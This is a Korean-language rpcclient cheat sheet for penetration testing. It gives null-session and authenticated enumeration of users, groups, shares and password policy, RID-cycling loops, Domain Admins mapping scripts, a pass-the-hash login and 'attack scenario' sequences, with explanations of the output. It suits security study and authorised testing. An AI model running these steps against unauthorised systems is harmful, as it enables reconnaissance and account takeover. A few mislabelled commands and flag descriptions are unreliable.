# RPCClient 치트시트

## 1. 설치

```bash
# Kali Linux
sudo apt update
sudo apt install samba-common-bin -y

# Ubuntu/Debian
sudo apt update
sudo apt install samba-common-bin -y

# CentOS/RHEL
sudo yum install samba-client samba-common -y
```

## 2. 기본 사용법

```bash
# 익명(NULL) 세션으로 접속 (가장 기본)
rpcclient -U "" -N <TARGET_IP>

# 사용자 계정으로 접속
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP>

# 도메인 계정으로 접속
rpcclient -U "<DOMAIN>/<USERNAME>%<PASSWORD>" <TARGET_IP>

# 대화식 모드가 아닌 바로 명령 실행 (-c 옵션)
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "srvinfo"
```

## 3. 주요 옵션 상세 설명

```bash
# 기본 옵션
-U <사용자명>    # 사용자 이름 지정 (형식: [도메인/]사용자명[%비밀번호])
-N               # NULL 세션 사용 (비밀번호 없음)
-c "<명령어>"     # 명령어 실행 후 종료
-p <포트번호>     # 포트 번호 지정 (기본값: 445)
-d <디버그레벨>   # 디버그 레벨 설정 (0-10)
-W <워크그룹>     # 워크그룹/도메인 이름 지정
-I <IP주소>      # 직접 IP 주소 지정
-A <인증파일>     # 인증 정보가 있는 파일 사용
-k               # Kerberos 인증 사용
--pw-nt-hash     # NT 해시로 비밀번호 제공 (Pass-the-Hash)
--use-ccache     # 기존 Kerberos 티켓 사용
--no-pass        # 비밀번호 없음
-P               # 플레인 텍스트 인증 허용
-S <smb설정파일>  # SMB 설정 파일 지정
-t <타임아웃>     # 연결 타임아웃 설정(초)
--signing=off    # SMB 서명 비활성화
--signing=on     # SMB 서명 활성화
--signing=required # SMB 서명 필수화
```

## 4. 주요 열거 명령어 (대화식 모드)

### 4.1 시스템 정보 수집

```bash
# 서버 정보 조회
srvinfo

# 운영체제 정보 조회
netshareenum

# 도메인 정보 조회
netdomaininfo

# 현재 로그인한 사용자
netloggeduserinfo

# 도메인 암호 정책 확인
getdompwinfo

# 서버 시간 확인
gettime
```

### 4.2 사용자 및 그룹 열거

```bash
# 모든 사용자 목록 조회
enumdomusers

# 도메인 그룹 목록 조회
enumdomgroups

# 도메인 별칭 그룹 조회
enumalsgroups builtin
enumalsgroups domain

# 특정 사용자 정보 조회 (RID 필요)
queryuser 500  # Administrator 계정 (RID 500)

# 특정 그룹 정보 조회 (RID 필요)
querygroup 512  # Domain Admins (RID 512)

# 사용자 그룹 멤버십 조회
querygroupmem 512  # Domain Admins 그룹의 멤버 조회

# 사용자의 별칭 조회
queryaliasuser builtin <RID>
queryuseraliases domain <USERNAME>

# 도메인 사용자와 그룹 매핑 표시
querydispinfo
querydispinfo2
querydispinfo3
```

### 4.3 RID 관련 명령어

```bash
# 계정 이름으로 RID 조회
lookupnames <USERNAME>

# RID로 계정 이름 조회
lookupsids S-1-5-21-XXXX-XXXX-XXXX-500

# RID 순환 공격 (RID Cycling) - 사용자 열거
for i in {500..600}; do rpcclient -U "" -N <TARGET_IP> -c "queryuser $i"; done
```

### 4.4 공유 및 파일 관련 명령어

```bash
# 사용 가능한 공유 목록 조회
netshareenum

# 특정 공유에 연결된 세션 조회
netsessenum

# 특정 공유에 대한 자세한 정보
netsharegetinfo <SHARE_NAME>

# 공유 파일 열거
netfileenum <SHARE_NAME>

# 열린 파일 목록 조회
netfileenum

# 공유에 연결된 클라이언트 조회
netconnenum
```

### 4.5 프린터 관련 명령어

```bash
# 프린터 열거
enumprinters

# 프린터 드라이버 정보 조회
enumdrivers

# 프린터 작업 열거
enumjobs <PRINTER_NAME>
```

### 4.6 기타 유용한 명령어

```bash
# 서비스 목록 조회
enumservices

# 기본 설정 정보 조회
getdcname <DOMAIN>

# 도움말 보기
help

# 명령어 목록 보기
help <COMMAND_NAME>

# RPC 서버 종료
shutdown

# 클라이언트 종료
exit
quit
```

## 5. 실전 사용 예시

### 5.1 기본 시스템 정보 수집

```bash
# NULL 세션으로 서버 정보 수집
rpcclient -U "" -N <TARGET_IP> -c "srvinfo"

# 모든 사용자 목록 조회
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers"

# 모든 도메인 그룹 조회
rpcclient -U "" -N <TARGET_IP> -c "enumdomgroups"

# 패스워드 정책 확인
rpcclient -U "" -N <TARGET_IP> -c "getdompwinfo"
```

### 5.2 여러 명령 연속 실행 (스크립트 사용)

```bash
# 기본 정보 일괄 수집 스크립트
for cmd in srvinfo netdomaininfo enumdomusers enumdomgroups getdompwinfo; do
    echo "[+] Executing: $cmd"
    rpcclient -U "" -N <TARGET_IP> -c "$cmd"
    echo ""
done
```

### 5.3 RID 사이클링 (열거 공격)

```bash
# RID 500-600 범위 사용자 열거
for i in {500..600}; do
    rpcclient -U "" -N <TARGET_IP> -c "queryuser $i" | grep "User Name\|Account"
done

# 모든 도메인 그룹의 멤버 찾기
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "enumdomgroups" | grep -oP '".*"' | tr -d '"' | while read group; do
    rid=$(rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "lookupnames $group" | awk '{print $2}' | cut -d',' -f1)
    echo "Group: $group (RID: $rid)"
    rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "querygroupmem $rid"
done
```

### 5.4 특권 계정 찾기

```bash
# Domain Admins 그룹 멤버 찾기
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "querygroupmem 512" | while read line; do
    rid=$(echo $line | awk '{print $1}')
    rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "queryuser $rid"
done

# Administrator 계정 정보 확인
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "queryuser 500"
```

### 5.5 Pass-the-Hash 공격

```bash
# NT 해시로 연결 (Pass-the-Hash)
rpcclient -U "Administrator" --pw-nt-hash <NT_HASH> <TARGET_IP>
```

## 6. 일반적인 문제 해결

```bash
# SMB 버전 호환성 문제 해결
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> --option="client min protocol=NT1"

# 디버그 모드로 실행 (문제 진단)
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -d 3

# 연결 시간 초과 처리
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -t 30

# 접근 거부 문제 (권한 부족)
# 다른 계정으로 시도하거나 적절한 권한을 가진 계정 필요
```

## 7. 공격 시나리오 예시

### 7.1 초기 정보 수집 (NULL 세션)

```bash
# 1. 서버 정보 확인
rpcclient -U "" -N <TARGET_IP> -c "srvinfo"

# 2. 사용자 목록 조회 시도
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers"

# 3. 공유 목록 확인
rpcclient -U "" -N <TARGET_IP> -c "netshareenum"
```

### 7.2 사용자 계정 매핑

```bash
# 1. 사용자 목록 가져오기
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "enumdomusers" > users.txt

# 2. 각 사용자의 세부 정보 조회
cat users.txt | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do
    rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "queryuser $rid"
done

# 3. 특정 그룹의 모든 멤버 조회 (예: Domain Admins)
admin_rids=$(rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "querygroupmem 512" | awk '{print $1}')
for rid in $admin_rids; do
    rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "queryuser $rid"
done
```

### 7.3 암호 정책 분석 및 계정 잠금 테스트

```bash
# 암호 정책 확인
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "getdompwinfo"

# 계정 잠금 정책 확인
rpcclient -U "<USERNAME>%<PASSWORD>" <TARGET_IP> -c "getusrdompwinfo 1000" # 특정 사용자 RID
```

## 8. 결과 분석 및 해석

### 8.1 enumdomusers 결과 해석

```
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[test] rid:[0x3e8]
```

- `user:` - 사용자 이름
- `rid:` - 상대적 식별자(16진수), 0x1f4는 500(10진수)

### 8.2 queryuser 결과 해석

```
    User Name   :   administrator
    Full Name   :
    Home Drive  :
    Dir Drive   :
    Profile Path:
    Logon Script:
    Description :   Built-in account for administering the computer/domain
    Comment     :
    Remote Dial :
    Logon Time               :      Wed, 11 Jun 2025 13:45:50 KST
    Logoff Time              :      Wed, 31 Dec 1969 16:00:00 KST
    Kickoff Time             :      Wed, 31 Dec 1969 16:00:00 KST
    Password last set Time   :      Wed, 11 Jun 2025 10:54:16 KST
    Password can change Time :      Wed, 11 Jun 2025 10:54:16 KST
    Password must change Time:      Wed, 13 Sep 30828 08:48:05 KST
    unknown_2[0..31]...
    user_rid :      0x1f4
    group_rid:      0x201
    acb_info :      0x00000210
    fields_present: 0x00ffffff
    logon_divs:     168
    bad_password_count:     0x00000000
    logon_count:    0x00000001
```

- `User Name` - 사용자 계정명
- `user_rid` - 16진수 RID (0x1f4 = 500)
- `acb_info` - 계정 제어 비트 (0x00000210 = 활성화된 계정)
- `Password last set Time` - 마지막 암호 변경 시간
- `Password must change Time` - 암호 만료 시간 (30828년은 만료 없음)
- `bad_password_count` - 잘못된 로그인 시도 횟수
- `logon_count` - 성공한 로그인 횟수

### 8.3 getdompwinfo 결과 해석

```
min_password_length: 8
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

- `min_password_length` - 최소 암호 길이
- `password_properties` - 암호 정책
  - `DOMAIN_PASSWORD_COMPLEX` - 복잡한 암호 요구
  - `DOMAIN_PASSWORD_NO_ANON_CHANGE` - 익명 암호 변경 금지
  - `DOMAIN_PASSWORD_NO_CLEAR_CHANGE` - 암호 변경시 평문 필요
  - `DOMAIN_LOCKOUT_ADMINS` - 관리자도 잠금
  - `DOMAIN_PASSWORD_STORE_CLEARTEXT` - 평문 저장 가능
  - `DOMAIN_REFUSE_PASSWORD_CHANGE` - 암호 변경 거부
